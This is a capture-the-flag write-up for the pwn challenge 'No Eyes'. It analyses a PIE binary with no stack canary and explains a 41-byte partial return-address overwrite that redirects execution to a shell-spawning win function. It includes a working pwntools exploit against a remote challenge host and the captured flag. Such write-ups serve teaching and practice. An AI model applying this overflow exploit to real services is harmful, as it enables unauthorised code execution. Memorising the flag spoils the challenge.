# No Eyes - Writeup

**Category:** `Pwn`  
**Description:** `Remote:` `nc 34.62.69.250 41063`

## Challenge Overview

We are given a binary (`chall`) along with its custom dynamic linker (`ld-linux-x86-64.so.2`) and C library (`libc.so.6`). The binary runs as a remote service reachable via netcat.

---

## Initial Analysis

### File Type

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter ./ld-linux-x86-64.so.2, not stripped
```

We have a 64-bit PIE (Position Independent Executable) binary, dynamically linked with a custom loader and libc.

### Security

```
$ checksec --file=chall
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```

| Mitigation | Status | Implication |
|---|---|---|
| **No Stack Canary** | ❌ | Buffer overflows won't be detected |
| **NX** | ✅ | Cannot execute shellcode on the stack |
| **PIE** | ✅ | Addresses randomized at runtime |
| **Full RELRO** | ✅ | GOT is read-only after startup |

No stack canary is the key weakness — we can overflow the buffer without detection.

### Interesting Strings

```bash
$ strings chall
You found it!
/bin/sh
Input:
Welcome
Return reached safely
```

The string `/bin/sh` and `You found it!` strongly suggest a **win function** that spawns a shell.

---

## Reverse Engineering

### `main()` — `0x1296`

```asm
main:
    endbr64
    push    rbp
    mov     rbp, rsp
    mov     eax, 0
    call    init                        ; setvbuf + alarm(120)
    lea     rax, [crash_handler]
    mov     rsi, rax
    mov     edi, 11                     ; SIGSEGV
    call    signal
    lea     rax, [crash_handler]
    mov     rsi, rax
    mov     edi, 4                      ; SIGILL
    call    signal
    lea     rax, [msg_welcome]          ; "Welcome"
    mov     rdi, rax
    call    puts
    mov     eax, 0
    call    vulnerable                  ; <-- calls the vulnerable function
    lea     rax, [msg_return]           ; "Return reached safely"
    mov     rdi, rax
    call    puts
    mov     eax, 0
    pop     rbp
    ret
```

`main` sets up signal handlers for `SIGSEGV` and `SIGILL` that immediately exit the program (via `crash_handler` → `_exit(1)`), then prints "Welcome", calls `vulnerable`, and finally prints "Return reached safely".

### `vulnerable()` — `0x125d`

```asm
vulnerable:
    endbr64
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20                   ; Allocate 32 bytes on stack
    lea     rax, [msg_input]            ; "Input: "
    mov     rdi, rax
    mov     eax, 0
    call    printf
    lea     rax, [rbp-0x20]             ; Buffer at rbp-0x20
    mov     edx, 0x100                  ; Read up to 256 bytes
    mov     rsi, rax                    ; into a 32-byte buffer!
    mov     edi, 0                      ; from stdin
    call    read
    nop
    leave
    ret
```

**The bug**: `read(0, buf, 256)` reads up to 256 bytes into a **32-byte** buffer. This is a textbook stack buffer overflow.

### Stack Layout

```
         +------------------+
rbp-0x20 |     buffer       |  ← 32 bytes
         +------------------+
rbp      |   saved rbp      |  ← 8 bytes
         +------------------+
rbp+0x08 |   return addr    |  ← 8 bytes (overwritable)
         +------------------+
```

### `win()` — `0x122a`

```asm
win:
    endbr64
    push    rbp
    mov     rbp, rsp
    lea     rax, [msg_found]            ; "You found it!"
    mov     rdi, rax
    call    puts
    mov     edx, 0                      ; envp = NULL
    mov     esi, 0                      ; argv = NULL
    lea     rax, [bin_sh]               ; "/bin/sh"
    mov     rdi, rax
    call    execve                      ; spawn shell!
    nop
    pop     rbp
    ret
```

This is the win function — it prints "You found it!" and then executes `/bin/sh` with `execve("/bin/sh", NULL, NULL)`, giving us a shell.

### `crash_handler()` — `0x1218`

```asm
crash_handler:
    endbr64
    push    rbp
    mov     rbp, rsp
    mov     edi, 1
    call    _exit
```

If the program crashes (SIGSEGV/SIGILL), the handler calls `_exit(1)` immediately.

---

## Vulnerability

**Stack buffer overflow** in `vulnerable()`:

```c
void vulnerable() {
    char buf[32];              // 32 bytes on stack
    printf("Input: ");
    read(0, buf, 0x100);       // reads up to 256 bytes — overflow!
}
```

The `read` call writes up to 256 bytes into a 32-byte stack buffer, allowing us to overwrite the saved RBP and return address.

---

## Exploitation Strategy

### The Problem: PIE

Since PIE is enabled, all code addresses are randomized at runtime. We don't know the base address of the binary, so we can't jump directly to `win` by writing a full 8-byte address.

### The Solution: Partial Return Address Overwrite

The key insight is that **PIE randomizes only the page-aligned base address** (upper bits). The lower 12 bits (page offset) are fixed.

Looking at the relevant offsets:

```
main's continuation after vulnerable call:  base + 0x12e9
win function:                                base + 0x122a
```

Both addresses share the same upper bytes — they only differ in the **least significant byte**:

- `0x12e9` → bytes: `e9 12 ...`
- `0x122a` → bytes: `2a 12 ...`

When `vulnerable` is called, the return address `base + 0x12e9` is pushed onto the stack. In little-endian, the lowest byte is `0xe9`. By overwriting **only that single byte** with `0x2a`, we change the return address to `base + 0x122a` — the `win` function!

The high bytes (affected by ASLR) are preserved because we only touch the first byte of the 8-byte address.

### Payload Layout

```
Offset  Size  Content      Purpose
─────────────────────────────────────
0x00    32    'A' × 32     Fill buffer (rbp-0x20 to rbp-0x01)
0x20    8     'B' × 8      Overwrite saved RBP (can be anything)
0x28    1     0x2a         Overwrite LSB of return addr: 0x12e9 → 0x122a
                            └─ Redirects to win()
```

Total payload size: **41 bytes**.

The `read()` syscall reads exactly what we send (up to 256 bytes), so sending only 41 bytes leaves the remaining bytes of the return address intact.

---

## Exploit

```python
from pwn import *

context.binary = './chall'
context.log_level = 'info'

# Connect to remote
r = remote('34.62.69.250', 41063)

# Wait for the "Input: " prompt
r.recvuntil(b'Input:')

# Payload: 32 bytes buffer + 8 bytes saved RBP + 1 byte partial overwrite
payload = b'A' * 32          # fill buffer
payload += b'B' * 8          # overwrite saved rbp
payload += b'\x2a'           # overwrite LSB: 0x12e9 -> 0x122a (win)

r.send(payload)

# Wait for the win message confirming we reached win()
r.recvuntil(b'You found it!\n')

# We now have a shell — interact with it
r.sendline(b'cat flag.txt')
flag = r.recvline().decode().strip()

print(f"Flag: {flag}")

r.close()
```

### Running the Exploit

```bash
$ python3 exploit.py
[+] Opening connection to 34.62.69.250 on port 41063: Done
Flag: 0xV01D{9906cc246553733b68b4f3926199ffab}
```

---

## Flag

```
0xV01D{9906cc246553733b68b4f3926199ffab}
```

---

## Key Takeaways

1. **No canary → exploitable overflow**: The absence of a stack canary makes buffer overflows trivially exploitable.

2. **PIE ≠ invulnerable**: PIE can be bypassed with partial overwrites when the target function is in the same page as the original return address.

3. **Signal handlers as crash protection**: The challenge uses signal handlers for SIGSEGV/SIGILL to prevent crash-based brute forcing, but doesn't stop a precise single-shot exploit.

4. **Blind ROP**: The source file is named `blind_rop.c` — "blind" refers to working without a direct leak, using the partial overwrite technique to redirect execution despite ASLR.
